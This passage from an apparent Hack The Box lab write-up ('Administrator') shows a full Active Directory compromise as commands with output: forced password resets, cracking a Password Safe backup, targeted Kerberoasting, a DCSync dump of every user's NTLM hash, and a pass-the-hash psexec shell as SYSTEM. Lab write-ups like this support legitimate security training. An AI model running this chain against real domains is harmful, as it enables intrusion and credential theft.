8151f0e252201496674dc8e6f00026329656cfa21f34342c [VERBOSE] SPN removed successfully for (michael) So even though it\u0026rsquo;s not recommended in real-life engagements, i changed the michael\u0026rsquo;s password using bloodyAD.\n1 2 3 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ bloodyAD -u \u0026#34;olivia\u0026#34; -p \u0026#34;ichliebedich\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --host \u0026#34;10.10.11.42\u0026#34; set password \u0026#34;Michael\u0026#34; \u0026#34;P@ssw0rd123\u0026#34; [+] Password changed successfully! And then i will change Benjamin\u0026rsquo;s password as well since we have now ForceChangePassword over it.\n1 2 3 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ bloodyAD -u \u0026#34;Michael\u0026#34; -p \u0026#34;P@ssw0rd123\u0026#34; -d \u0026#34;Administrator.htb\u0026#34; --host \u0026#34;10.10.11.42\u0026#34; set password \u0026#34;Benjamin\u0026#34; \u0026#34;P@ssw0rd123\u0026#34; [+] Password changed successfully! I tried to access the ftp server using Michael\u0026rsquo;s credentials but i couldn\u0026rsquo;t, but we i did it using Benjamin\u0026rsquo;s i succeed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ ftp 10.10.11.42 Connected to 10.10.11.42. 220 Microsoft FTP Service Name (10.10.11.42:ayoub): benjamin 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||61937|) 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. And as we can see above we got a Backup.psafe3 file, which is a password database (in an encrypted format) file created by Password Safe, a popular open-source password management tool.\nWe can\u0026rsquo;t read this file directly and we need a Master password that the database is protected with, so we will use pwsafe2john to convert the file into a format that John can process.\n1 2 3 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ pwsafe2john Backup.psafe3 \u0026gt; hash.txt Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050 Then we will crack this using rockyou.txt wordlist using john.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ john --show hash.txt Backu:tekieromucho 1 password hash cracked, 0 left Used the password tekieromucho to open the database using pwsafe.\nWe found the passwords of 3 users as seen below. We can get each user\u0026rsquo;s password by right clicking on the user and chose copy the password to the clipboard.\nI looked into each of these users in Bloodhound and as a result the Emily have CanPSRemote on the Domain Controller, and most importantly it has GenericWrite on Ethan who have DCSync right on the Domain Administrator.htb which will lead us into domain compromise.\nI used evil-winrm to connect to the DC to get the user.txt flag.\nSince we have GenericWrite on Ethan we will try to perform a targeted Kerberoasting first, and if the hash is not crackable we will be forced to change his password (not recommended in real-life!).\n1 2 3 4 5 6 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ sudo ./targetedKerberoast.py -d \u0026#34;Administrator.htb\u0026#34; --dc-ip 10.10.11.42 -u \u0026#34;emily\u0026#34; -p \u0026#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#34; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (ethan) $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$7bed537141bd14d91ba9ec5be93a956b$7c4184b5c470bd1bfeef1794bf3a54b3b246d35ca9d23eb544292a5e3331f28955b3381c00d3edf7d00d65c8d481e7ce6370ba842ad7068d3ec6f7725f138ae2ef4144f5422f35c9a27e9bb03870f5697bcbace85e4a7514d578e611a1c69e25d723afa0c01060e7b5e05639189f749cf994a4937ac1a3ff45c987f3985973f5000bacb87ca84765f889d8a70d652cf9fc9a928611bb49c4334b8923559a906b1b4b6d43a3ce180fed0be3475daab72d296613feba6f87e15d593a5cf7f9c9d81e9f44279e727e2ced375cb5022d7c26f64d4f7c1af67fa95f297cb0bafa1048b219158df8a21c16b44fb407c57232f9cafaad3693798d78bcbb989f6404f4ee58349dbb4478e31efc3d8eb686af9054f30c77dae7f0c9103cc7ddc3ea09dd5f81c3c6b000142fb51371ce05959b7fa830eb3a8fa006d0afa2a193c7bfcfb4868ad6a1c7497dbf4dc499bd19fffbdf8840c3faa074b1fc6dbddc849050aeafe55a71cf40297489a6cfbcc9cca26f5004fdb46187466c97646b289b5c486c6a443992da66a881960547b29237ec18cef499889d327926674f2e8f8de54d232eaa6875bf8cead86fd54f1a254335e286bfd6a9345de418d392e324ec79148184f6f6fc41ccaf42c850409ffa2b6bce9c37c619e5037a4394ad35dee0e49121da74d981d84ae8e386be5ed407f1d5cafc22ab8f74ee1870c4a3f3dac65763fba369e61baa086ebe7e109a1ef1ac329d73770e1e76b02740e895e8cce3b6013aeb3ba5717fb6ddbf12af3e69043b0f7e9e0d1f56ba158e6e49a47d96021766a9687537eec9485076f52982ffb5dae667bee6b92b0f6d594cc47f984e9bac0002ab3ac4105ed1a2de8ea9e8107e98a7d8455e3ec206edf2e4d29756809f7f1453e93b9b3dfe5a5763c9f234f68da0265ec886c47f05a16e31735c41c37f9126954e30080d6a57076c3f53cbfe9646f1d849f8ad60aec35f2c3bb87850d501a3597f26b4ad5f7d06a32bfdcc719ca701e8e4ad61280dd41035e354719affc7a10a2f1145487e458c6c1b20da2a78db81093e2666b54fe20b96fb7c8e1c891faef2b4103151d5a7779caa0d53fbbb0d0dea94a18b0d780536cd7e27f3c02afbed8fcb3dd54b8d194e64f895095c0f7047a38ddfcfba1e09b973408e95c2b9d26cd7f870e1969408cc3d6a5ddecdc29290cffc80fe951784b5c3f85a61425df971f37e3d83e8a0d8280814a38ff3ec99ead94bd2c9711a1f74f866295af0ec2a217def2dcf325e0ed27e15a912b00f08a797511665736dd26472bb3925fa591f44a2a511105f44a9a89480ef84a740ff7ae5859fbe71dbc15c1b2da91703bde841a07bcbf2708d262d2df115131d80563b12527316315361585bf59bb61b5bf52bc610ff3675415c26cc6d4e0e43c7370997f6049467a36ac080a1c95cbaa91baa729d992e8712f308303f1f73d1221095c237bb88c41a320eeee5bd96a03aadf0d354ed486ca41e56d48d2ce13f610c4ddbf2bade912767f2f20b5e71016021def06c We got Lucky and the hash got cracked successfully. Ethan\u0026rsquo;s password is limpbizkit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 PS C:\\Windows\\hashcat-6.2.6\u0026gt; .\\hashcat.exe -m 13100 C:\\Users\\acer\\Desktop\\hash.txt C:\\Users\\acer\\Desktop\\rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 2.1 ) - Platform #1 [Intel(R) Corporation] ============================================================= * Device #1: Intel(R) UHD Graphics, 1536/3163 MB (790 MB allocatable), 24MCU * Device #2: Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, skipped Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt . . \u0026lt;SNIP\u0026gt; . . $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$7bed537141bd14d91ba9ec5be93a956b$7c4184b5c470bd1bfeef1794bf3a54b3b246d35ca9d23eb544292a5e3331f28955b3381c00d3edf7d00d65c8d481e7ce6370ba842ad7068d3ec6f7725f138ae2ef4144f5422f35c9a27e9bb03870f5697bcbace85e4a7514d578e611a1c69e25d723afa0c01060e7b5e05639189f749cf994a4937ac1a3ff45c987f3985973f5000bacb87ca84765f889d8a70d652cf9fc9a928611bb49c4334b8923559a906b1b4b6d43a3ce180fed0be3475daab72d296613feba6f87e15d593a5cf7f9c9d81e9f44279e727e2ced375cb5022d7c26f64d4f7c1af67fa95f297cb0bafa1048b219158df8a21c16b44fb407c57232f9cafaad3693798d78bcbb989f6404f4ee58349dbb4478e31efc3d8eb686af9054f30c77dae7f0c9103cc7ddc3ea09dd5f81c3c6b000142fb51371ce05959b7fa830eb3a8fa006d0afa2a193c7bfcfb4868ad6a1c7497dbf4dc499bd19fffbdf8840c3faa074b1fc6dbddc849050aeafe55a71cf40297489a6cfbcc9cca26f5004fdb46187466c97646b289b5c486c6a443992da66a881960547b29237ec18cef499889d327926674f2e8f8de54d232eaa6875bf8cead86fd54f1a254335e286bfd6a9345de418d392e324ec79148184f6f6fc41ccaf42c850409ffa2b6bce9c37c619e5037a4394ad35dee0e49121da74d981d84ae8e386be5ed407f1d5cafc22ab8f74ee1870c4a3f3dac65763fba369e61baa086ebe7e109a1ef1ac329d73770e1e76b02740e895e8cce3b6013aeb3ba5717fb6ddbf12af3e69043b0f7e9e0d1f56ba158e6e49a47d96021766a9687537eec9485076f52982ffb5dae667bee6b92b0f6d594cc47f984e9bac0002ab3ac4105ed1a2de8ea9e8107e98a7d8455e3ec206edf2e4d29756809f7f1453e93b9b3dfe5a5763c9f234f68da0265ec886c47f05a16e31735c41c37f9126954e30080d6a57076c3f53cbfe9646f1d849f8ad60aec35f2c3bb87850d501a3597f26b4ad5f7d06a32bfdcc719ca701e8e4ad61280dd41035e354719affc7a10a2f1145487e458c6c1b20da2a78db81093e2666b54fe20b96fb7c8e1c891faef2b4103151d5a7779caa0d53fbbb0d0dea94a18b0d780536cd7e27f3c02afbed8fcb3dd54b8d194e64f895095c0f7047a38ddfcfba1e09b973408e95c2b9d26cd7f870e1969408cc3d6a5ddecdc29290cffc80fe951784b5c3f85a61425df971f37e3d83e8a0d8280814a38ff3ec99ead94bd2c9711a1f74f866295af0ec2a217def2dcf325e0ed27e15a912b00f08a797511665736dd26472bb3925fa591f44a2a511105f44a9a89480ef84a740ff7ae5859fbe71dbc15c1b2da91703bde841a07bcbf2708d262d2df115131d80563b12527316315361585bf59bb61b5bf52bc610ff3675415c26cc6d4e0e43c7370997f6049467a36ac080a1c95cbaa91baa729d992e8712f308303f1f73d1221095c237bb88c41a320eeee5bd96a03aadf0d354ed486ca41e56d48d2ce13f610c4ddbf2bade912767f2f20b5e71016021def06c:limpbizkit Let\u0026rsquo;s now DCSync the domain and dump all hashes of all users of the administrator.htb domain.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ sudo secretsdump.py \u0026#34;Administrator.htb/ethan:limpbizkit\u0026#34;@\u0026#34;dc.Administrator.htb\u0026#34; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6::: administrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7::: administrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd::: administrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd::: administrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31::: administrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884::: administrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199::: administrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3::: . . . \u0026lt;SNIP\u0026gt; . . Finally, we will use the psexec.py to get a shell as the administrator using his NT hash that we got from above, and then get the root.txt flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ psexec.py \u0026#39;administrator.htb/Administrator@10.10.11.42\u0026#39; -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 10.10.11.42..... [*] Found writable share ADMIN$ [*] Uploading file HpFTdtnz.exe [*] Opening SVCManager on 10.10.11.42..... [*] Creating service xqpP on 10.10.11.42..... [*] Starting service xqpP..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.20348.2762] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system C:\\Windows\\system32\u0026gt; cd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop\u0026gt; dir Volume in drive C has no label. Volume Serial Number is 6131-DE70 Directory of C:\\Users\\Administrator\\Desktop 11/01/2024 02:47 PM \u0026lt;DIR\u0026gt; . 10/22/2024 11:46 AM \u0026lt;DIR\u0026gt; .. 03/28/2025 10:01 AM 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 8,439,169,024 bytes free ","date":"2025-02-22T00:00:00Z","image":"https://r4z1o.github.io/p/administrator-htb-writeup/Administrator_hu_3e5b601aa36ef578.png","permalink":"https://r4z1o.github.io/p/administrator-htb-writeup/","title":"Administrator HTB Writeup"}]